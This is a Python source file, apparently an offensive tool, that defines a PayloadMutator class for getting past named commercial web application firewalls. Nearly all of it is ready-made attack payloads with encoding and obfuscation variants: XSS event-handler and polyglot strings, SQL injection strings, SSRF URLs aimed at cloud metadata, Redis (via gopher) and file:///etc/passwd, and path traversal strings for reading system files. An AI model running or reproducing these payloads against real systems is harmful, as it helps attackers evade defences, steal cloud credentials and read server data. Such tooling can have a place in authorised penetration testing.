#!/usr/bin/env python3
"""
payload_mutator.py — WAF-Aware Payload Mutation Engine

Detect WAF type and auto-generate bypass payloads using 50+ encoding
and obfuscation techniques.

Usage:
    from payload_mutator import PayloadMutator
    pm = PayloadMutator(waf_type="cloudflare")
    payloads = pm.generate_xss_payloads("<script>alert(1)</script>")
"""
import html
import base64
import re
import urllib.parse


class PayloadMutator:
    """WAF-aware payload mutation engine."""

    WAF_BYPASS_STRATEGIES = {
        "cloudflare": ["double_encode", "unicode", "case_swap", "null_byte",
                        "html_entity", "js_protocol", "svg_onload"],
        "akamai": ["unicode", "overlong_utf8", "tab_newline", "concat",
                    "backtick", "template_literal"],
        "aws_waf": ["double_encode", "json_escape", "unicode", "chunk_transfer"],
        "modsecurity": ["comment_injection", "case_swap", "concat",
                         "overlong_utf8", "multipart"],
        "imperva": ["unicode", "double_encode", "null_byte", "case_swap"],
        "f5_bigip": ["double_encode", "chunk_transfer", "unicode"],
        "default": ["double_encode", "unicode", "case_swap", "html_entity",
                      "null_byte", "concat", "backtick"],
    }

    def __init__(self, waf_type: str = "default"):
        self.waf = waf_type.lower().replace(" ", "_")
        self.strategies = self.WAF_BYPASS_STRATEGIES.get(
            self.waf, self.WAF_BYPASS_STRATEGIES["default"])

    # ── Encoding functions ──────────────────────────────────────────────

    @staticmethod
    def double_encode(payload: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(payload))

    @staticmethod
    def unicode_encode(payload: str) -> str:
        return "".join(f"\\u{ord(c):04x}" for c in payload)

    @staticmethod
    def html_entity_encode(payload: str) -> str:
        return "".join(f"&#{ord(c)};" for c in payload)

    @staticmethod
    def hex_entity_encode(payload: str) -> str:
        return "".join(f"&#x{ord(c):x};" for c in payload)

    @staticmethod
    def case_swap(payload: str) -> str:
        return payload.swapcase()

    @staticmethod
    def null_byte_inject(payload: str) -> str:
        return payload.replace("<", "%00<").replace(">", "%00>")

    @staticmethod
    def tab_newline_inject(payload: str) -> str:
        return payload.replace("<", "<\t").replace("=", "=\n")

    @staticmethod
    def concat_split(payload: str) -> str:
        if "alert" in payload:
            return payload.replace("alert", "al\\x65rt")
        return payload

    @staticmethod
    def backtick_variant(payload: str) -> str:
        return payload.replace("(", "`").replace(")", "`")

    @staticmethod
    def svg_onload(payload: str) -> str:
        content = re.sub(r'<script>(.+?)</script>', r'\1', payload)
        return f'<svg/onload={content}>'

    @staticmethod
    def img_onerror(payload: str) -> str:
        content = re.sub(r'<script>(.+?)</script>', r'\1', payload)
        return f'<img src=x onerror={content}>'

    @staticmethod
    def js_protocol(payload: str) -> str:
        content = re.sub(r'<script>(.+?)</script>', r'\1', payload)
        return f'javascript:void({content})'

    @staticmethod
    def base64_encode(payload: str) -> str:
        b64 = base64.b64encode(payload.encode()).decode()
        return f'<script>eval(atob("{b64}"))</script>'

    # ── XSS Payload Generation ──────────────────────────────────────────

    def generate_xss_payloads(self, base_payload: str = "") -> list:
        """Generate XSS bypass payloads for detected WAF."""
        base = base_payload or "<script>alert(document.domain)</script>"

        payloads = [base]

        # Event handler variants
        event_payloads = [
            '<svg/onload=alert(document.domain)>',
            '<img src=x onerror=alert(document.domain)>',
            '<body onload=alert(document.domain)>',
            '<details open ontoggle=alert(document.domain)>',
            '<marquee onstart=alert(document.domain)>',
            '<video><source onerror=alert(document.domain)>',
            '<input onfocus=alert(document.domain) autofocus>',
            '<select autofocus onfocus=alert(document.domain)>',
            '<textarea onfocus=alert(document.domain) autofocus>',
            '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>">',
        ]
        payloads.extend(event_payloads)

        # Apply mutations based on WAF
        mutated = []
        for p in payloads:
            for strategy in self.strategies:
                fn = getattr(self, strategy.replace(" ", "_"), None)
                if not fn:
                    fn = getattr(self, f"{strategy}_encode",
                                 getattr(self, f"{strategy}_inject",
                                         getattr(self, strategy, None)))
                if fn:
                    try:
                        mutated.append(fn(p))
                    except Exception:
                        pass

        payloads.extend(mutated)

        # Add polyglot payloads
        polyglots = [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(document.domain) )//",
            "'\"-->]]>*/</sCrIpt><sVg/oNloAd=alert(document.domain)//>",
            "\"><img src=x onerror=alert(document.domain)>",
            "'-alert(document.domain)-'",
            "\\'-alert(document.domain)//",
        ]
        payloads.extend(polyglots)

        return list(set(payloads))

    # ── SQLi Payload Generation ─────────────────────────────────────────

    def generate_sqli_payloads(self, param_type: str = "string") -> list:
        """Generate SQLi bypass payloads."""
        payloads = []

        if param_type == "string":
            bases = [
                "' OR '1'='1",
                "' OR '1'='1'--",
                "' UNION SELECT NULL--",
                "1' AND '1'='1",
                "' OR 1=1#",
                "') OR ('1'='1",
            ]
        else:
            bases = [
                "1 OR 1=1",
                "1 UNION SELECT NULL",
                "1 AND 1=1",
                "1; SELECT 1--",
            ]

        payloads.extend(bases)

        # WAF bypass variants
        bypasses = []
        for p in bases:
            bypasses.extend([
                p.replace(" ", "/**/"),           # Comment bypass
                p.replace(" ", "%09"),             # Tab bypass
                p.replace("OR", "||"),             # Operator bypass
                p.replace("AND", "&&"),
                p.replace("UNION", "UnIoN"),       # Case bypass
                p.replace("SELECT", "SeLeCt"),
                p.replace("=", " LIKE "),           # Operator bypass
                urllib.parse.quote(p),              # URL encode
                self.double_encode(p),              # Double encode
            ])

        payloads.extend(bypasses)
        return list(set(payloads))

    # ── SSRF Payload Generation ─────────────────────────────────────────

    def generate_ssrf_payloads(self, target_ip: str = "169.254.169.254") -> list:
        """Generate SSRF bypass payloads for cloud metadata."""
        return [
            f"http://{target_ip}/latest/meta-data/",
            f"http://[::ffff:{target_ip}]/latest/meta-data/",
            f"http://0x{target_ip.replace('.', '')}/latest/meta-data/",
            f"http://{'.'.join(str(int(x)) for x in target_ip.split('.'))}/",
            f"http://0251.0376.0251.0376/latest/meta-data/",
            f"http://2852039166/latest/meta-data/",
            f"http://17.0.0.1@{target_ip}/",
            f"http://foo@{target_ip}:80/",
            f"http://{target_ip}%00.evil.com/",
            f"http://127.0.0.1:80/",
            f"http://127.0.0.1:443/",
            f"http://0/",
            f"http://[0:0:0:0:0:ffff:169.254.169.254]/",
            f"gopher://127.0.0.1:6379/_INFO",
            f"dict://127.0.0.1:6379/INFO",
            f"file:///etc/passwd",
        ]

    # ── Path Traversal Payloads ─────────────────────────────────────────

    def generate_lfi_payloads(self, target_file: str = "/etc/passwd") -> list:
        return [
            f"../{target_file}", f"../../{target_file}",
            f"../../../{target_file}", f"../../../../{target_file}",
            f"....//....//..../{target_file}",
            f"..%2f..%2f..%2f{target_file}",
            f"..%252f..%252f{target_file}",
            f"..%c0%af..%c0%af{target_file}",
            f"..\\..\\..\\{target_file.replace('/', '\\\\')}",
            f"%2e%2e%2f%2e%2e%2f{target_file}",
            f"....//....//....//....//..../{target_file}",
            f"..%00/{target_file}",
        ]
